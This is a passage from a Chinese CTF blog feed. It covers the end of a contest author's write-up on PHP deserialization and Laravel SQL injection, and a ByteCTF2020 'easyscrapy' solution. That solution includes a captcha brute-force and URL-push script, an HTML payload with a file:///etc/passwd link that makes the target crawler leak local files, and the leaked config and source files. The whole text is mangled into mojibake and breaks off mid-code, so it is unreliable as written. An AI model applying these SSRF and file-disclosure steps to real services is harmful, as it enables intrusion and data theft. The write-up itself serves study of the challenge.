å†™å¥½åæ²¡æœ‰<code>db.close()</code>.é‚£è¿™æœ¬åœ°å¿…ç„¶æ˜¯æ‹¿ä¸åˆ°æŸ¥è¯¢ç»“æœçš„ã€‚</p><h2 id="SimpleSimplePie-1-solves"><a href="#SimpleSimplePie-1-solves" class="headerlink" title="SimpleSimplePie [1 solves]"></a>SimpleSimplePie [1 solves]</h2><p>æŒ–é“¾å­æ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€ä»¥åªèƒ½è‡ªå·±æ‰‹å†™å‡ ä¸ªä¹±ä¸ƒå…«ç³Ÿçš„ç±»æ¥æ„é€ popé“¾äº†ã€‚æ•´ä½“æ€è·¯æˆ‘æ„Ÿè§‰è·Ÿtpç³»åˆ—çš„pop chain å·®ä¸å¤šï¼Ÿå°±æ˜¯ä¸ªsuper-miniç‰ˆçš„<code>__toString() -&gt; __call() -&gt; call_user_func</code>è°ƒç”¨è‡ªèº«å‡½æ•°ã€‚</p><p>ç„¶ååˆ©ç”¨åˆ™æ¯”è¾ƒæœ‰æ„æ€ã€‚çµæ„Ÿå½“ç„¶å°±æ˜¯ä¹‹å‰åšhtbæ—¶å‘ç°çš„æ–°å§¿åŠ¿ ssrf æ‰“memcacheè§¦å‘ååºåˆ—åŒ–. åæ¥æ„å¤–å‘ç°è¿™æ ·çš„åˆ©ç”¨å…¶å®å®æˆ˜ä¸­è¿˜æŒºä¸å°‘çš„ï¼Œæ¯”å¦‚ä¹‹å‰å®‰æ’ä¿Šæ°å¸ˆå‚…çš„<code>ssrf -&gt; RCEçš„è‰°éš¾åˆ©ç”¨</code>å°±æ˜¯ssrf æ‰“redisè§¦å‘thinkphpååºåˆ—åŒ–.æˆ‘çš„é¢˜ç›¸æ¯”å®æˆ˜è¿˜æ˜¯ç®€å•å¤šäº†ã€‚</p><p>è¿™é‡Œpopé“¾é‡Œæœ‰ä¸ªå°å‘å°±æ˜¯é“¾å­çš„èµ·ç‚¹é€‰<code>__wakeup</code>æœ€å¥½ã€‚æˆ‘è‡ªå·±å½“åˆè°ƒè¯•çš„æ—¶å€™å°±å‘ç°å¦‚æœç”¨<code>__destruct</code>åšèµ·ç‚¹ï¼Œä¼šå› ä¸ºåºåˆ—åŒ–æ•°æ®çš„ä¸€äº›å†…å®¹è§¦å‘simplepieçš„æŠ¥é”™ã€‚æ‰€ä»¥å†™åˆ©ç”¨ç±»æ—¶æ•…æ„åˆéš¾åŠ äº†ä¸ª<code>__destruct</code>å¸Œæœ›è¸©ä¸ªå‘(æˆ‘çˆ¬äº†)ã€‚ä½†æ˜¯å”¯ä¸€è§£å‡ºçš„rmbå¸ˆå‚…åœ¨é€‰æ‹©äº†<code>__destruct</code>åšèµ·ç‚¹åæ˜¯ç”¨äº†phpggcé‡Œçš„fast destruct æ¥è¿›å…¥<code>__destruct</code>ã€‚è¿™å€’ç¡®å®å‡ºä¹æˆ‘æ„æ–™,å­¦åˆ°äº†ã€‚</p><h2 id="bg-laravel-0-solves"><a href="#bg-laravel-0-solves" class="headerlink" title="bg_laravel [0 solves]"></a>bg_laravel [0 solves]</h2><p>æ²¡æƒ³åˆ°æœ€ålaravelæˆäº†é˜²aké¢˜â€¦â€¦å› ä¸ºæ—¶ä¸´æ—¶èµ¶çš„ï¼Œæ‰€ä»¥å¾ˆå¤šåœ°æ–¹å†™çš„ä¸æ˜¯å¾ˆå¥½ï¼Œè¿˜è¯·è§è°…ã€‚ç”šè‡³ç”±sqlæ³¨å…¥åˆ°ä¸Šä¼ getshelléƒ½æ˜¯çµå…‰ä¸€é—ªæƒ³å‡ºæ¥çš„ã€‚</p><p>é¢˜ç›®ä¹‹æ‰€ä»¥ç”¨äº†ä¿å›½å½“ç„¶æ˜¯å› ä¸ºæœ€è¿‘è¢«é©¬è€å¸ˆçš„é¬¼ç•œç»™æ´—è„‘äº†233ã€‚æ‰€ä»¥æˆ‘çš„é¢˜ç›®ä¸Šä¼ ä¸ç»™å›æ˜¾è·¯å¾„ï¼Œå…¶å®æ˜¯å¹´è½»äººä¸è®²æ­¦å¾·ä¸å‘Šè¯‰ä½ æ–‡ä»¶å :) </p><p>é¦–å…ˆåœ¨å›½å†…CTF laravelçš„ååºåˆ—åŒ–æ—©å°±è¢«æ‰“çƒ‚äº†ï¼Œæ‰€ä»¥æˆ‘å°±æƒ³èƒ½ä¸èƒ½å‡ºç‚¹æ–°æ„ã€‚è¯´èµ·æ¥ä¹‹å‰ä¸ƒæœˆç«å¸ˆå‚…çš„laravelæ–‡ç« ä¸‹å±…ç„¶æœ‰äººè¯´æ²¡äººè¿™ä¹ˆå†™æ§åˆ¶å™¨æ‰€ä»¥ååºåˆ—åŒ–æ²¡æœ‰ç”¨ï¼Œè¿™å°±æ¥æ‰“è„¸ã€‚ä¼—æ‰€å‘¨çŸ¥,pharååºåˆ—åŒ–ç›´æ¥æ‰©å®½äº†phpååºåˆ—åŒ–çš„åˆ©ç”¨é¢ã€‚ä¸€ä¸ªlaravelç«™é‡Œå‡ºç°çš„æ–‡ä»¶æµæ“ä½œç»å¯¹ä¸å°‘ï¼Œé‚£ä¹ˆå¦‚æœèƒ½æœ‰å¯æ§ç‚¹è§¦å‘pharååºåˆ—åŒ–,ç»“åˆpopé“¾ç›´æ¥å°±èƒ½getshell.</p><p>ä½†æ˜¯è¿™ä¹ˆè€ƒå¤ªç®€å•äº†ï¼Œæ‰€ä»¥è‡ªç„¶æ˜¯åŠ ç‚¹èŠ±ã€‚</p><p>åˆšå¥½æˆ‘æœ€è¿‘æ¥è§¦åˆ°äº†laravel 5.8.10çš„å¾ˆå†·é—¨çš„sqlæ³¨å…¥ã€‚å†·é—¨ä¸»è¦æ˜¯å› ä¸ºgithubä¸Šä¿®å¤éƒ½åªæ˜¯è¯´ä¿®å¤äº†é€ƒé€¸å•å¼•å·çš„æ¼æ´,è€Œä¸æ˜¯æ˜è¯´çš„sqlæ³¨å…¥æ¼æ´ã€‚è€Œä¸”åˆ©ç”¨æ¡ä»¶ä¹Ÿæœ‰ç‚¹è‹›åˆ»ï¼Œä¸€ä¸ªæ˜¯è¦è¾“å…¥å¯æ§,å¦ä¸€ä¸ªæ˜¯å›æ˜¾å¾—æœ‰jsonæ•°æ®,å¦åˆ™<code>json_extract()</code>ä¼šæŠ¥é”™ã€‚wpé‡Œç»™çš„å‚è€ƒæ–‡ç« ä¹Ÿåªæ˜¯è¯´äº†<code>addSelect()</code>,<code>select()</code> + jsonå›æ˜¾çš„æ•°æ®å¯èƒ½ä¼šå¯¼è‡´sqlæ³¨å…¥ã€‚å¯å®é™…ä¸Šï¼Œé¢˜ç›®ä¸­å‡ºç°çš„<code>orderby()</code>ä¹Ÿæ˜¯å¯ä»¥æ³¨å…¥çš„ã€‚è¿™å°±è¦çœ‹å¸ˆå‚…ä»¬è‡ªå·±debugäº†ã€‚æˆ‘è‡ªå·±æ˜¯å½“åˆç›´æ¥wrapJsonPathé‚£ä¸‹æ–­ç‚¹ç¢°è¿æ°”åœ¨å¯æ§ä½ç½®ä¸€ä¸ªä¸ªå°è¯•è§¦å‘æ‰å‘ç°çš„ã€‚</p><p>sqlæ³¨å…¥æ€ä¹ˆè·Ÿpharååºåˆ—åŒ–ç»“åˆå‘¢ï¼Ÿé™¤å¼€å¯æ§çš„<code>phar://</code>è¾“å…¥ç‚¹ï¼Œæˆ‘ç¬¬ä¸€æƒ³æ³•æ˜¯æŠŠä¸Šä¼ çš„æ–‡ä»¶åéšæœºåŒ–ï¼Œç„¶åæŠŠæ–‡ä»¶åä¹‹ç±»çš„ä¿å­˜åœ¨mysqlé‡Œã€‚ä½†æ˜¯å¾ˆæœ‰æ„æ€çš„æ˜¯ï¼Œæˆ‘åœ¨ç½‘ä¸Šæ‰¾äº†ä¸å°‘laravelçš„æ–‡ä»¶ä¸Šä¼ éƒ½ç”¨äº†ORM,ä¹Ÿå°±æ˜¯è¯´,Fileç±»æ˜¯ä¸ªEloquent model.æ‰§è¡Œ<code>$file-&gt;save()</code>æ—¶å¯¹åº”çš„æ•°æ®å°±éƒ½åˆ°äº†æ•°æ®åº“é‡Œäº†,æ­£åˆæˆ‘æ„ã€‚</p><p>æ‰€ä»¥å¯èƒ½å¤§éƒ¨åˆ†å¸ˆå‚…è¢«è¿™ä¸ªå†·é—¨çš„laravel sqlæ³¨å…¥ç»™éš¾ä½äº†ã€‚æ‰€ä»¥è¿˜æ˜¯è¦å¤šè°·æ­Œ+æŸ¥çœ‹å®˜æ–¹è¿™ä¸ªç‰ˆæœ¬çš„ä¸€äº›å°æ”¹åŠ¨,è¯´ä¸å®šå°±èƒ½å®šä½æ¼æ´ç‚¹äº†ã€‚</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  æ€»ä¹‹è¿™æ¬¡æ¯”èµ›èƒ½çœ‹åˆ°å¸ˆå‚…ä»¬åšè‡ªå·±çš„é¢˜,é¡ºä¾¿äº¤æµä¸‹æ€è·¯è¿˜æ˜¯æ¯”è¾ƒå¼€å¿ƒçš„ã€‚å¸Œæœ›å¤§å®¶æ˜å¹´èƒ½æ¥ç€æ¥ç©ï¼Œä¹Ÿå¯ä»¥æœŸå¾…ä¸‹ä¸çŸ¥é“æœ‰æ²¡æœ‰çš„X1CTF </p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByteCTF2020-easyscrapy</title>
      <link href="2020/10/26/ByteCTF2020-easyscrapy/"/>
      <url>2020/10/26/ByteCTF2020-easyscrapy/</url>
      
        <content type="html"><![CDATA[<p> è¿™æ¬¡ByteCTFçš„webé¢˜éš¾åº¦å±å®ç¦»è°±ã€‚å¥½å‡ é“é¢˜å‡ ä¹éƒ½æ— æ³•ä¸‹æ‰‹ã€‚è‡ªå·±ç¬¬ä¸€å¤©ä¸»è¦æ˜¯çœ‹äº†easyscrapyä»¥åŠé…äº†beakerçš„ç¯å¢ƒ(ç»“æœæ ¹æœ¬æ“ä½œä¸èµ·æ¥ï¼Œäºæ˜¯æ”¾å¼ƒäº†â€¦â€¦)ç¬¬äºŒå¤©ä¸Šåˆåœ¨é…scrapyçš„ç¯å¢ƒï¼Œä¸€ç›´åˆ°ä¸‹åˆæ‰å‡ºæ€è·¯,åŸºæœ¬ä¸Šç»™æˆ‘å‡ å°æ—¶å°±èƒ½å‡ºäº†ã€‚ç„¶è€Œå› ä¸ºè¦èµ¶é£æœºç»“æœæ²¡æ—¶é—´åšäº†â€¦â€¦æ™šä¸Šåˆ°äº†åæ€»å½’æ˜¯æŠŠé¢˜ç›®åšå‡ºæ¥äº†ã€‚åªèƒ½è¯´æœ‰ç‚¹å¯æƒœï¼Œä¸ç„¶å¯ä»¥ä¸ºå°ç»¿è‰æ‹¿ä¸ªä¸‰/å››è¡€çš„ã€‚</p><p>è¿™é‡Œæˆ‘åˆ†äº«ä¸‹è‡ªå·±ä¸€è·¯ä¸‹æ¥çš„ä¸»è¦æ€è·¯å§ã€‚å¸Œæœ›èƒ½å¯¹ä»–äººæœ‰æ‰€å¸®åŠ©ã€‚å¦å¤–å†™æ–‡ç« æ—¶ç¯å¢ƒå·²ç»å…³äº†ï¼Œæ²¡å•¥å›¾ï¼Œå°†å°±ç€çœ‹å§</p><a id="more"></a><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>é¦–å…ˆé¢˜ç›®æœ¬èº«ç»™å‡ºäº†ä¸€ä¸ªåŠŸèƒ½å¯ä»¥è®©æˆ‘ä»¬è¾“å…¥urlä»¥åŠä¸€ä¸ªéªŒè¯ç ï¼Œä½†æ˜¯æ³¨æ„åˆ°è¿™é‡Œcookieæ˜¯flaskçš„session,å­˜å‚¨çš„å†…å®¹ä¸æ¯æ¬¡é¡µé¢å›æ˜¾çš„éªŒè¯ç ä¸€è‡´ã€‚æ‰€ä»¥é¦–å…ˆæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å‡å°‘åé¢çš„å·¥ä½œçš„æ–¹æ³•,å°±æ˜¯å¸¦ä¸Šå›ºå®šçš„cookieå†™è„šæœ¬è¿›è¡Œå­˜å‚¨urlçš„æ“ä½œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">URL=<span class="string">'http://39.102.69.151:30010/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookies=&#123;<span class="string">'session'</span>:<span class="string">'eyJjb2RlIjoiZTFiMmQ5IiwidXNlciI6IjVhNTkwZjVhLTE2ZjgtMTFlYi1hYThhLTAyNDJhYzE0MDAwNiJ9.X5XSBA.z2Nn4le-aOsM8jg82j7gMzfzhSc'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">(code)</span>:</span></span><br><span class="line">    a = string.digits + string.ascii_lowercase + string.ascii_uppercase</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> a:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> a:</span><br><span class="line">                        p = i + j + k + m + n</span><br><span class="line">                        s = hashlib.md5(p.encode(<span class="string">'utf-8'</span>)).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">                        <span class="keyword">if</span> s == code:</span><br><span class="line">                            print(p)</span><br><span class="line">                            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">()</span>:</span></span><br><span class="line">    r=requests.get(URL,cookies=cookies)</span><br><span class="line">    varify=re.findall(<span class="string">r'&lt;span&gt;substr\(md5\(\$str\), 0, 6\) === (.*)&lt;/span&gt;'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> varify</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(url,code)</span>:</span></span><br><span class="line">    r=requests.post(url=URL+<span class="string">'push'</span>,cookies=cookies,data=&#123;<span class="string">'url'</span>:url,<span class="string">'code'</span>:code&#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"><span class="comment">#code=brute(send())</span></span><br><span class="line"><span class="comment">#print(code)</span></span><br><span class="line">push(<span class="string">'http://120.27.246.202/'</span>,code)</span><br><span class="line"><span class="comment">#push('http://127.0.0.1:','0AUDp')</span></span><br></pre></td></tr></table></figure><p>çˆ†ç ´ä¸€æ¬¡åå°±å¯ç»§ç»­ç”¨äº†ã€‚</p><p>ä¹‹åå‘ç°ï¼Œå½“è¾“å…¥å®Œurlå­˜å‚¨åï¼Œurllistä¸­ä¼šå­˜åœ¨æˆ‘ä»¬åˆšåˆšè¾“å…¥çš„urlã€‚ä¹‹åç‚¹å‡»åˆ™ä¼šå‰å¾€<code>/result?url=xxxx</code>.ä¼¼ä¹æ˜¯ä¸€ä¸ªssrfçš„ç‚¹ã€‚</p><p>ç¬¬ä¸€å¤©ä¸Šåˆçš„è¯ï¼Œæ„Ÿè§‰çˆ¬ä»€ä¹ˆéƒ½çˆ¬ä¸åˆ°ã€‚ä½†æ˜¯å½“æ—¶å¾€è‡ªå·±çš„vpsä¸Šæ‰“çš„æ—¶å€™å€’æ˜¯æœ‰æ„å¤–çš„å‘ç°<br>å½“æ—¶çš„ç¬”è®°:<br><img src="https://i.imgur.com/hiUBWKq.png" class="lazyload" data-srcset="https://i.imgur.com/hiUBWKq.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ„å¤–å‘ç°äº†scrapy_redisä»¥åŠpycurlã€‚æ­£å¦‚ä¸Šé¢æ‰€è¯´ï¼Œurlæ•°æ®ä¼¼ä¹æ˜¯è¢«å­˜åˆ°redisç„¶åè¢«çˆ¬è™«ç»™çˆ¬äº†ã€‚è€Œåé¢<code>/result?url</code>åˆ™æ˜¯åŠ¨ç”¨äº†å¦ä¸€ç§åŠŸèƒ½è¿›è¡Œpycurlçš„è¯·æ±‚ã€‚</p><p>è¿™é‡Œpycurlæ— ç–‘æ˜¯å€¼å¾—æ³¨æ„çš„,å› ä¸ºpycurlæœ¬è´¨ä¸Šä¼¼ä¹æ˜¯è·Ÿè°ƒç”¨<code>curl</code>ä¸€æ ·çš„ã€‚é‚£ä¹ˆå¯ä»¥ä½¿ç”¨<code>gopher</code>åè®®ã€‚</p><p>è¿™æ ·ä¸€æ¥å½“ç„¶å°±æƒ³æ¢æµ‹redisäº†ã€‚ä¸è¿‡ç»è¿‡å°è¯•,ä¼šå‘ç°æ²¡æœ‰ä»»ä½•å›æ˜¾ã€‚å…³äºç‰ˆæœ¬ç­‰ç­‰ä¿¡æ¯ä¹Ÿæ˜¯ä¸€æ— æ‰€çŸ¥ã€‚</p><p>æ­¤æ—¶å†æ¬¡å®éªŒæ‰“è‡ªå·±ï¼Œæˆ‘å‘ç°å½“æ›´æ¢è‡ªå·±æœåŠ¡ç«¯çš„å†…å®¹æ—¶ï¼Œ<code>/result</code>æ‰€æ˜¾ç¤ºçš„é¡µé¢å¹¶æ²¡æ”¹å˜ã€‚</p><p>è”ç³»åˆ°ä¸Šé¢çš„<code>scrapy_redis</code>,æˆ‘ä»¬ä¸éš¾æ¨æµ‹,<code>scrapy</code>ä¼šçˆ¬æˆ‘ä»¬å­˜å‚¨çš„é‚£ä¸ªurl,å¹¶å°†å½“æ—¶çš„å†…å®¹ç¼“å­˜(åé¢ä¼šå‘ç°æ˜¯mongodb)ã€‚æ‰€ä»¥è¿™å°±å¯¼è‡´,åå¤ç”¨resulté¡µé¢è¯·æ±‚urlå¹¶ä¸ä¼šæ”¹å˜å›æ˜¾å†…å®¹ã€‚å……å…¶é‡è°ƒç”¨äº†pycurlè¯·æ±‚è€Œå·²ã€‚</p><p>é‚£ä¹ˆï¼Œåˆ°æ­¤æˆ‘ä»¬å¯¹æ•´ä¸ªæœåŠ¡çš„æ„æ¶æœ‰äº†å¤§æ¦‚çš„æ€è·¯</p><ol><li>å­˜åœ¨çˆ¬è™«bot</li><li>å­˜åœ¨redis</li><li>å¯èƒ½å­˜åœ¨æŸæ•°æ®åº“</li><li>pycurl æ˜¯webæœåŠ¡è¯·æ±‚ï¼Œscrapy_redisæ˜¯çˆ¬è™«botè¯·æ±‚   </li></ol><p>ä½†æ˜¯è¿™äº›ä¿¡æ¯éå¸¸å±€é™ã€‚é¦–å…ˆåªæœ‰å­˜è¿›redisçš„æ•°æ®æ‰ä¼šè¢«çˆ¬è™«è¯·æ±‚,è¿™é‡Œpythonæ²¡æœ‰crlfå¿…ç„¶æ‰“ä¸äº†redis.è€Œpycurlè™½ç„¶å¯ä»¥ç”¨gopheré‚£ä¸€å¥—æ‰“,ä½†æ˜¯å†…ç½‘ä¿¡æ¯æœªçŸ¥,ä¸”æ²¡æœ‰å›æ˜¾ã€‚</p><p>è¿™æ—¶æˆ‘å¼€å§‹å°è¯•æ€§çˆ¬ä¸€äº›ç½‘ç«™ã€‚è®½åˆºçš„æ˜¯baiduèƒ½çˆ¬å®ƒè‡ªå·±çš„bytedanceçˆ¬ä¸äº†2333. ç„¶åçˆ¬æœ¬æœº127.0.0.1ä¹Ÿå®Œå…¨æ²¡æœ‰å†…å®¹(å› ä¸ºbotå¼€äº†ç«¯å£çš„æœåŠ¡å®é™…ä¸Šåªæœ‰ä¸€ä¸ª6023çš„telnet,æ‰“äº†ä¼šæå‰æŠ¥é”™,ä¸€æ ·æ— å›æ˜¾)</p><p>é‚£ä¹ˆ,ä¸å¦¨å°è¯•ä¸‹æ‰“å®ƒçš„å…¬ç½‘ipï¼Ÿè¿™æ—¶æˆ‘å‘ç°ä¸€ä¸ªå¥‡æ€ªçš„ç°è±¡ã€‚<br>å½“æˆ‘è¾“å…¥å®ƒçš„å…¬ç½‘ipå­˜è¿›redisåï¼Œå®ƒé™¤äº†æœ¬èº«ï¼Œè¿˜è¯»å–äº†<code>/list</code>çš„é¡µé¢ã€‚</p><p>é‚£ä¹ˆè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ç®€å•çœ‹äº†ä¸‹é¡µé¢ã€‚å‘ç°é‡Œé¢å­˜åœ¨<code>&lt;a href=&quot;/list&quot;&gt;&lt;/&gt;</code><br>çœ‹æ¥ï¼Œçˆ¬è™«ç«¯æ˜¯ä¼šæ ¹æ®<code>&lt;a href=&quot;xxx&quot;&gt;&lt;/a&gt;</code>è¿›è¡Œè¿›ä¸€æ­¥çˆ¬å–.ç»è¿‡ç»å…¸çš„å®éªŒæ‰“è‡ªå·±ï¼Œå‘ç°çš„ç¡®å®ƒä¼šé¡ºç€è¿™ä¸ªhrefè¿›è¡Œè¯·æ±‚ã€‚</p><p>æ­¤æ—¶å·²ç»çŸ¥é“hrefæœ‰çŒ«è…»äº†ã€‚ç„¶åå‡ºé¢˜äººå·²ç»æ”¾å‡ºäº†ç¬¬ä¸€ä¸ªhintã€‚å°±æ˜¯å°è¯•è¯»æºç ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ä¸å¦¨å°è¯•ä¸‹ï¼Œé¡ºç€è¿™ä¸ªhref+fileåè®®è¿›è¡Œæºç çš„é˜…è¯»ï¼Ÿ</p><h2 id="leak-source-code"><a href="#leak-source-code" class="headerlink" title="leak source code"></a>leak source code</h2><p>åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå­˜å‚¨</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥ç€ä¸Šé¢çš„è„šæœ¬è·‘ä¸€éã€‚ä¸€æŠŠæ¢­è§£å†³é—®é¢˜ã€‚<br>å†æ¬¡è®¿é—®<code>/result</code>ã€‚å‘ç°è¯»åˆ°äº†<code>/etc/passwd</code></p><p>æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬ä¾æ¬¡è¯»ä¸‹å…¶ä»–å†…å®¹<br><code>/proc/self/cmdline</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash run.sh</span><br></pre></td></tr></table></figure><p><code>/proc/self/environ</code><br>å¾—çŸ¥å½“å‰PWDæ˜¯<code>/code</code></p><p>è¯»<code>/code/run.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">scrapy crawl byte</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨çš„æ˜¯scrapyæ¡†æ¶è¿›è¡Œçˆ¬å–ã€‚</p><p>æ­¤æ—¶å¼€å§‹è‡ªå·±ç›²ç›®çš„è¯»ç»“æœå‘ç°å•¥éƒ½æ²¡è¯»åˆ°,æƒ³äº†æƒ³å‘ç°è¿™ä¸ªçˆ¬è™«botå¯èƒ½åªæœ‰è¿™ä¹ˆä¸€ä¸ªå‘½ä»¤åœ¨è¿è¡Œã€‚é‚£ä¹ˆæˆ‘åº”è¯¥å»æŸ¥æ‰¾scrapyçš„æ–‡æ¡£<br>æˆ‘ä»¬æ‰¾åˆ°scrapyå®˜æ–¹æ–‡æ¡£</p><p><img src="https://i.imgur.com/5ZlDlDG.png" class="lazyload" data-srcset="https://i.imgur.com/5ZlDlDG.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ˜¾ç„¶æˆ‘ä»¬åªéœ€è¯»å–<code>scrapy.cfg</code>å°±èƒ½æ‹¿åˆ°scrapyé¡¹ç›®åå¹¶è¯»å–åˆ°ä¸‹é¢æ‰€æœ‰æ–‡ä»¶ã€‚ä¸è¿‡spiderçš„åå­—ä¼¼ä¹æ˜¯è‡ªå®šä¹‰çš„</p><p><img src="https://i.imgur.com/uXo8IiC.png" class="lazyload" data-srcset="https://i.imgur.com/uXo8IiC.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="https://i.imgur.com/zVeZub0.png" class="lazyload" data-srcset="https://i.imgur.com/zVeZub0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å‰é¢å‘½ä»¤è¡Œæ‰§è¡Œçš„æ˜¯<code>scrapy crawl byte</code>é‚£ä¹ˆå¯ä»¥ç¡®è®¤spiderçš„nameæ˜¯byte.æ–‡ä»¶åä¹Ÿå¯èƒ½æ˜¯byte.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Automatically created by: scrapy startproject</span><br><span class="line">#</span><br><span class="line"># For more information about the [deploy] section see:</span><br><span class="line"># https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html</span><br><span class="line"></span><br><span class="line">[settings]</span><br><span class="line">default &#x3D; bytectf.settings</span><br><span class="line"></span><br><span class="line">[deploy]</span><br><span class="line">#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;</span><br><span class="line">project &#x3D; bytectf</span><br></pre></td></tr></table></figure><p>å…¶ä»–å†…å®¹ä¹Ÿéƒ½ä¸€å¹¶è¯»å–ã€‚<br>å®Œæ•´çš„æ–‡ä»¶æˆ‘ä¼šæ”¾è‡ªå·±githubä¸Šã€‚åŒ…æ‹¬redisè·Ÿmongodbçš„docker</p><p>æ­¤æ—¶æˆ‘é€šè¿‡pipelines.pyä¸settings.pyåˆ†åˆ«å¾—åˆ°äº†mongodbä¸redisçš„é…ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//pipelines.py</span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfPipeline</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        